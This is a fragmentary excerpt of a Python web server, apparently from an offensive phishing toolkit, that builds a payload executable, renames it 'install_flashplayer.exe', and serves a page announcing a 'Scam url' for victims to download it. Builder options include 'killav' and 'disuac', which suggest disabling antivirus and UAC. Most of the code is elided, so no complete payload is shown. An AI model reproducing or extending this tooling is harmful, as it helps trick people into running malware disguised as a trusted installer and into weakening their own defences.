...
from core.color import R, G, Y, B, M, C, colored_print, print_banner, set_colors
import os
import random
import re
import subprocess
...
def params():
    ...
    params = {}
    for p in [
            "zip", "sp", "tp", "psp", "killav", "disuac", "upx", "bats", "pss",
            "vbss", "ico", "event", "o32", "o64"
    ]:
        try:
    ...
    if "[*] Finished" in output:
        ...
        blah = os.rename(
            ...
            os.path.join("static", "data", "install_flashplayer.exe"))
        return '<center><h1>Executable generated!</h1><h2>Let\'s work ;) <br>   The Scam url is <a href="http://{0}/download" target="_blank">http://{0}/download</a></h2> <h3> <a href="http://{0}/static/data/install_flashplayer.exe" target="_blank">Direct download url</a></h3> <b>Happy Hunting</b></center>'.format(
            IP)
    else:
...
if __name__ == '__main__':
    ...
    info = "\t\tAuthor  : Karim Shoair ( D4Vinci )\t Server version : {} \n".format(
        open(os.path.join("templates", 'Server_version.txt'),
             "r").read().strip())
    banners = [
        '''
